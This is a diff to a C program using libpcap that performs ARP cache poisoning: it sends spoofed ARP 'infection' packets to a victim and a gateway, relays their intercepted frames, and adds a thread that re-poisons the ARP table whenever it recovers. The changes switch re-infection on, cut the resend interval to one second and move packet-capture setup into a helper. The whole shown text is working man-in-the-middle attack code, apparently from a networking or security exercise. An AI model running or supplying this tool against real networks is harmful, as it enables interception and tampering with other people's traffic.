@@ -65,7 +65,6 @@ struct IPMACADDR {
 };
 
 struct args {
-	char* device;
 	unsigned char* DestMacAddr;
 	unsigned int SourceIpAddr;
 };
@@ -74,6 +73,7 @@ struct args {
 bool GetMyIpAddr(char*, struct IPMACADDR*);
 bool GetMyMacAddr(char*, struct IPMACADDR*);
 bool GetMyGatewayIpAddr(char*, struct IPMACADDR*);
+bool PcapFiltering(pcap_t**, char*);
 void SetDefaultARP(struct ARP_Header*, unsigned char*, unsigned int, unsigned char*, unsigned int, int);
 void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
 bool GetVictimGatewayMacAddr(char*, struct IPMACADDR*);
@@ -172,16 +172,17 @@ int main(int argc, char* argv[]) {
 	}
 
 	// detect recover arp table and re-infect
-	// if (pthread_create(&Re_Infection, NULL, ReInfection, (void*)&IpMacAddr) != 0) {
-	//	perror("pthread_create()");
-	//	return -1;
-	// }
+	if (pthread_create(&Re_Infection, NULL, ReInfection, (void*)&IpMacAddr) != 0) {
+		perror("pthread_create()");
+		return -1;
+	}
 
 	// Send Infection packet (10s)
 	while (1) {
+		printf("hi\n");
 		SendInfectionPacket(handle, &IpMacAddr, TOVICTIM);
 		SendInfectionPacket(handle, &IpMacAddr, TOGATEWAY);
-		sleep(10);
+		sleep(1);
 	}
 
 	return 0;
@@ -263,6 +264,42 @@ bool GetMyGatewayIpAddr(char* device, struct IPMACADDR* IpMacAddr) {
 	return true;
 }
 
+bool PcapFiltering(pcap_t** handle, char* filter) {
+	unsigned int net, mask;
+	char* device;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct bpf_program fp;
+
+	device = pcap_lookupdev(errbuf);
+	if (device == NULL) {
+		printf("pcap_lookupdev() : %s\n", errbuf);
+		return false;
+	}
+
+	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
+		printf("pcap_lookupnet() : %s\n", errbuf);
+		return false;
+	}
+
+	*handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
+	if (*handle == NULL) {
+		printf("pcap_open_live() : %s\n", errbuf);
+		return false;
+	}
+
+	if (pcap_compile(*handle, &fp, filter, 0, net) == -1) {
+		printf("pcap_compile() : %s\n", pcap_geterr(*handle));
+		return false;
+	}
+
+	if (pcap_setfilter(*handle, &fp) == -1) {
+		printf("pcap_setfilter() : %s\n", pcap_geterr(*handle));
+		return false;
+	}
+
+	return true;
+}
+
 void SetDefaultARP(struct ARP_Header* packet, unsigned char* SourceMacAddr, unsigned int SourceIpAddr, unsigned char* DestMacAddr, unsigned int DestIpAddr, int Operation) {
 	packet->HardwareType = htons(HWTETHERNET);
 	packet->ProtocolType = htons(PROTOTYPEIP);
@@ -305,7 +342,6 @@ bool GetVictimGatewayMacAddr(char* device, struct IPMACADDR* IpMacAddr) {
 		return false;
 	}
 
-	pThread_args.device = device;
 	pThread_args.DestMacAddr = IpMacAddr->MyMacAddrHex;
 	pThread_args.SourceIpAddr = IpMacAddr->GatewayIpAddrHex;
 	if (pthread_create(&pThread_Gateway, NULL, RecvInfectionResponse, (void*)&pThread_args) != 0) {
@@ -371,36 +407,18 @@ bool SendInfectionPacket(pcap_t* handle, struct IPMACADDR* IpMacAddr, int Mode) 
 
 void* RecvInfectionResponse(void* pThread_args) {
 	unsigned char *DestMacAddr;
-	char* device, errbuf[PCAP_ERRBUF_SIZE];
-	unsigned int net, mask, SourceIpAddr;
+	unsigned int SourceIpAddr;
+	char filter[BUFSIZ] = "ether proto \\arp";
 	int ret;
 	struct PACKET_Header* packet;
-	struct bpf_program fp;
 	pcap_pkthdr* pkthdr;
 	pcap_t* handle;
 
-	device = ((struct args*)pThread_args)->device;
 	DestMacAddr = ((struct args*)pThread_args)->DestMacAddr;
 	SourceIpAddr = ((struct args*)pThread_args)->SourceIpAddr;
-	
-	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
-		printf("pcap_lookupnet() : %s\n", errbuf);
-		return (void*)-1;
-	}
 
-	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
-	if (handle == NULL) {
-		printf("pcap_open_live() : %s\n", errbuf);
-		return (void*)-1;
-	}
-	
-	if (pcap_compile(handle, &fp, "ether proto \\arp", 0, net) == -1) {
-		printf("pcap_compile() : %s\n",pcap_geterr(handle));
-		return (void*)-1;
-	}
-
-	if (pcap_setfilter(handle, &fp) == -1) {
-		printf("pcap_setfilter() : %s\n",pcap_geterr(handle));
+	if (PcapFiltering(&handle, filter) == false) {
+		printf("Fail to filtering\n");
 		return (void*)-1;
 	}
 
@@ -420,47 +438,21 @@ void* RecvInfectionResponse(void* pThread_args) {
 }
 
 void* PacketRelayVictim(void* args) {
-	unsigned int net, mask;
-	char* device, *filter;
-	char errbuf[PCAP_ERRBUF_SIZE];
+	char filter[BUFSIZ];
 	int ret;
 	struct PACKET_Header* packet;
 	struct IPMACADDR* IpMacAddr;
-	struct bpf_program fp;
 	pcap_pkthdr* pkthdr;
 	pcap_t* handle;
 
 	IpMacAddr = (struct IPMACADDR*)args;
 
-	device = pcap_lookupdev(errbuf);
-	if (device == NULL) {
-		printf("pcap_lookupdev() : %s\n", errbuf);
+	sprintf(filter, "ether src %s && not ip dst %s", IpMacAddr->VictimMacAddrStr, IpMacAddr->MyIpAddrStr);
+	if (PcapFiltering(&handle, filter) == false) {
+		printf("Fail to filtering\n");
 		return (void*)-1;
 	}
-
-	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
-		printf("pcap_lookupnet() : %s\n", errbuf);
-		return (void*)-1;
-	}
-
-	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
-	if (handle == NULL) {
-		printf("pcap_open_live() : %s\n", errbuf);
-		return (void*)-1;
-	}
-
-	// MacAddr is My Mac Addr && IpAddr is Gateway Addr --> Spoofed Packet
-	sprintf(filter, "ether dst %s && ip dst %s", IpMacAddr->MyMacAddrStr, IpMacAddr->GatewayIpAddrStr);
-	if (pcap_compile(handle, &fp, filter, 0, net) == -1) {
-		printf("pcap_compile() : %s\n",pcap_geterr(handle));
-		return (void*)-1;
-	}
-
-	if (pcap_setfilter(handle, &fp) == -1) {
-		printf("pcap_setfilter() : %s\n",pcap_geterr(handle));
-		return (void*)-1;
-	}
-
+	
 	while (1) {
 		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
 		if (ret == 0) 
@@ -469,58 +461,31 @@ void* PacketRelayVictim(void* args) {
 			printf("pcap_next_ex() : %s\n",pcap_geterr(handle));
 			return (void*)-1;
 		}
-		
+
 		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->GatewayMacAddrHex, MACSIZE);
 		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
-
-		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) {
+		
+		printf("Victim Relay : %d\n", pkthdr->len);
+		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
 			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
-			return (void*)-1;
-		}
 	}
 
 	return (void*)0;
 }
 
 void* PacketRelayGateway(void* args) {
-	unsigned int net, mask;
-	char* device, *filter;
-	char errbuf[PCAP_ERRBUF_SIZE];
+	char filter[BUFSIZ];
 	int ret;
 	struct PACKET_Header* packet;
 	struct IPMACADDR* IpMacAddr;
-	struct bpf_program fp;
 	pcap_pkthdr* pkthdr;
 	pcap_t* handle;
 
 	IpMacAddr = (struct IPMACADDR*)args;
 
-	device = pcap_lookupdev(errbuf);
-	if (device == NULL) {
-		printf("pcap_lookupdev() : %s\n", errbuf);
-		return (void*)-1;
-	}
-
-	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
-		printf("pcap_lookupnet() : %s\n", errbuf);
-		return (void*)-1;
-	}
-
-	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
-	if (handle == NULL) {
-		printf("pcap_open_live() : %s\n", errbuf);
-		return (void*)-1;
-	}
-
-	// MacAddr is My Mac Addr && IpAddr is Victim Addr --> Spoofed Packet
-	sprintf(filter, "ether dst %s && ip dst %s", IpMacAddr->MyMacAddrStr, IpMacAddr->VictimIpAddrStr);
-	if (pcap_compile(handle, &fp, filter, 0, net) == -1) {
-		printf("pcap_compile() : %s\n",pcap_geterr(handle));
-		return (void*)-1;
-	}
-
-	if (pcap_setfilter(handle, &fp) == -1) {
-		printf("pcap_setfilter() : %s\n",pcap_geterr(handle));
+	sprintf(filter, "ether src %s && not ip dst %s", IpMacAddr->GatewayMacAddrStr, IpMacAddr->MyIpAddrStr);
+	if (PcapFiltering(&handle, filter) == false) {
+		printf("Fail to filtering\n");
 		return (void*)-1;
 	}
 
@@ -535,16 +500,42 @@ void* PacketRelayGateway(void* args) {
 
 		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE);
 		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
-
-		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) {
+		printf("Gateway Relay : %d\n", pkthdr->len);		
+		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
 			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
-			return (void*)-1;
-		}
 	}
 
 	return (void*)0;
 }
 
-void* ReInfection(void* IpMacAddr) {
-	
+void* ReInfection(void* args) {
+	char filter[BUFSIZ];
+	int ret;
+	struct PACKET_Header* packet;
+	struct IPMACADDR* IpMacAddr;
+	pcap_pkthdr* pkthdr;
+	pcap_t* handle;
+
+	IpMacAddr = (struct IPMACADDR*)args;
+
+	sprintf(filter, "ether proto \\arp && (ether src %s || ether src %s)", IpMacAddr->VictimMacAddrStr, IpMacAddr->GatewayMacAddrStr);
+	if (PcapFiltering(&handle, filter) == false) {
+		printf("Fail to filtering\n");
+		return (void*)-1;
+	}
+
+	while (1) {
+		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
+		if (ret == 0)
+			continue;
+		else if (ret == -1) {
+			printf("pcap_next_ex() : %s\n", pcap_geterr(handle));
+			return (void*)-1;
+		}
+
+		if (memcmp(packet->ETH_Packet.SrcMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE) == 0) 
+			SendInfectionPacket(handle, IpMacAddr, TOGATEWAY);
+		else 
+			SendInfectionPacket(handle, IpMacAddr, TOVICTIM);
+	}
 }
